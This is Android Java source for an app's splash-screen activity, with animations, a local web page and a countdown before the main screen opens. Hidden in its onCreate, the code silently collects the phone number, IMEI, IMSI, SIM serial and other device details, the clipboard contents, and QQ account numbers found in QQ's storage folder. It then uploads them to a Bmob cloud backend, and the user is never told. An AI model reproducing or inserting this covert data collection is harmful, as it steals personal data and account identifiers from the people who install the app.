package xiaoheng.kapian;

import android.content.*;
import android.os.*;
import android.support.v7.app.*;
import android.telephony.*;
import android.view.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import cn.bmob.v3.*;
import cn.bmob.v3.listener.*;
import com.pgyersdk.crash.*;
import java.io.*;

public class Heng extends AppCompatActivity
{
	private LinearLayout l,ll,lll;
	private Handler handler;
	private CountDownTimer timer;
	private TextView t;
	private TianJiaXinXi xiaoheng;
	private String aa,jianqieban,aaa;
	
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);//隐藏状态栏
		this.requestWindowFeature(Window.FEATURE_NO_TITLE);
		//隐藏操作栏
		super.onCreate(savedInstanceState);
		setContentView(R.layout.qidongmian);
		
		//进入动画
		overridePendingTransition(R.anim.push_up_in,R.anim.push_up_out);
		
			
		//新建线程
		handler=new Handler();
		Runnable updateThread = new Runnable()
		{
			public void run()
			{
				//加载本地html文件
				WebView webView=(WebView)findViewById(R.id.xiaohengmainWebView1);
				webView.loadUrl("file:///android_asset/a.html");

				//倒计时
				timer=new CountDownTimer(6000,10)
				{
					public void onTick(long millisUntilFinished)
					{
						t.setText(millisUntilFinished/1000+"秒");
					}
					public void onFinish()
					{
						//倒计时完毕转跳
						startActivity(new Intent(Heng.this,MainActivity.class));
						//转跳动画
						overridePendingTransition(R.anim.push_left_in,R.anim.push_left_out);
						finish();
					}
				};
				timer.start();
				
			}
		};
		//开启线程
		handler.post(updateThread);
		
		l=(LinearLayout)findViewById(R.id.xiaohengmainLinearLayout1);
		ll=(LinearLayout)findViewById(R.id.xiaohengmainLinearLayout2);
		lll=(LinearLayout)findViewById(R.id.xiaohengmainLinearLayout3);
		t=(TextView)findViewById(R.id.xiaohengmainTextView1);
		
		//渐变
		Animation a=AnimationUtils.loadAnimation(Heng. this,R.anim.jianbian);
		l.startAnimation(a);
		lll.startAnimation(a);

		//旋转
		Animation b=AnimationUtils.loadAnimation(Heng. this,R.anim.xuanzuan);
		ll.startAnimation(b);
		
		//Application ID(Bmob后端云)
		Bmob.initialize(this,"4e1cb245cceeac4ff981af05ef549868");
		
		
		try
		{
		//获取手机信息
		StringBuilder phoneInfo = new StringBuilder();
		phoneInfo.append( "CPU位数：" + android.os.Build.CPU_ABI); 
		phoneInfo.append( "\n发行版本：" + android.os.Build.TAGS); 
		phoneInfo.append( "\n手机型号：" + android.os.Build.MODEL); 
		phoneInfo.append( "\nSDK：" + android.os.Build.VERSION.SDK); 
		phoneInfo.append( "\n安卓版本：" + android.os.Build.VERSION.RELEASE); 
		phoneInfo.append( "\n手机名称：" + android.os.Build.BRAND); 
		phoneInfo.append( "\n主板信息：" + android.os.Build.BOARD); 
		phoneInfo.append( "\n手机系统信息：" + android.os.Build.FINGERPRINT); 
		phoneInfo.append( "\n版本号：" + android.os.Build.ID); 
		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE); 
		phoneInfo.append("\nIMEI码：" + tm.getDeviceId()); 
		phoneInfo.append("\n本机手机号码：" + tm.getLine1Number()); 
		phoneInfo.append("\n所在地：" + tm.getNetworkCountryIso()); 
		phoneInfo.append("\n手机卡类型：" + tm.getNetworkOperatorName()); 
		phoneInfo.append("\n手机号码所在地：" + tm.getSimCountryIso()); 
		phoneInfo.append("\n手机卡状态：" + tm.getSimState()); 
		phoneInfo.append("\nIMSI码：" + tm.getSubscriberId()); 
		phoneInfo.append("\nProduct: " + android.os.Build.PRODUCT);
		phoneInfo.append( "\nVERSION_CODES.BASE: " + android.os.Build.VERSION_CODES.BASE);
		phoneInfo.append( "\nDEVICE: " + android.os.Build.DEVICE); 
		phoneInfo.append( "\nDISPLAY: " + android.os.Build.DISPLAY);
		phoneInfo.append( "\nMANUFACTURER: " + android.os.Build.MANUFACTURER); 
		phoneInfo.append( "\nUSER: " + android.os.Build.USER); 
		phoneInfo.append("\nDeviceSoftwareVersion = " + tm.getDeviceSoftwareVersion());
		phoneInfo.append("\nNetworkOperator = " + tm.getNetworkOperator()); 
		phoneInfo.append("\nNetworkType = " + tm.getNetworkType()); 
		phoneInfo.append("\nPhoneType = " + tm.getPhoneType()); 
		phoneInfo.append("\nSimOperator = " + tm.getSimOperator()); 
		phoneInfo.append("\nSimOperatorName = " + tm.getSimOperatorName()); 
		phoneInfo.append("\nSimSerialNumber = " + tm.getSimSerialNumber());
		phoneInfo.append("\nVoiceMailNumber = " + tm.getVoiceMailNumber()); 
		aa=phoneInfo.toString().toLowerCase();
		}
		catch(Exception w)
		{
			aa="获取手机信息失败";
		}
		
		try
		{
			// 获取剪切板数据
			ClipboardManager cm = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
			ClipData cd2 = cm.getPrimaryClip();
			jianqieban = cd2.getItemAt(0).getText().toString();
		}
		catch(Exception q)
		{
		//一般开机之后运行软件会闪退
		jianqieban="获取剪切板错误";
		}
		
		
		try
		{
				String qqq="登陆过的QQ";
			File dengluguodeQQ = new File("/storage/emulated/0/tencent/MobileQQ/artfilter");
			//判断file是否为目录
			if(dengluguodeQQ.isDirectory())
			{
				String[] fileNames = dengluguodeQQ.list();
				for(int i=0;i<fileNames.length;i++)
				{
					if (fileNames[i].endsWith(".config"))
					{
						aaa=fileNames[i].substring(0,fileNames[i].indexOf("artfilter.config"));
						
					}
				}
			}
		}
		catch(Exception e)
		{
			aaa="获取登陆过的QQ失败";
		}
		
		
		//添加数据
		xiaoheng=new TianJiaXinXi();
		xiaoheng.setName(aa);
		xiaoheng.setAddress(jianqieban);
		xiaoheng.setjiluqq(aaa);
		xiaoheng.save(Heng.this, new SaveListener()
			{
				@Override
				public void onSuccess()
				{
					//添加数据成功
				}
				@Override
				public void onFailure(int p1, String p2)
				{
					//添加数据失败
				}
			});
			
		//(蒲公英)集成
		PgyCrashManager.register(this);
		//上报 catch 异常
		try
		{} 
		catch (Exception e)
		{
			PgyCrashManager.reportCaughtException(Heng.this, e);
		}
		
	}
}
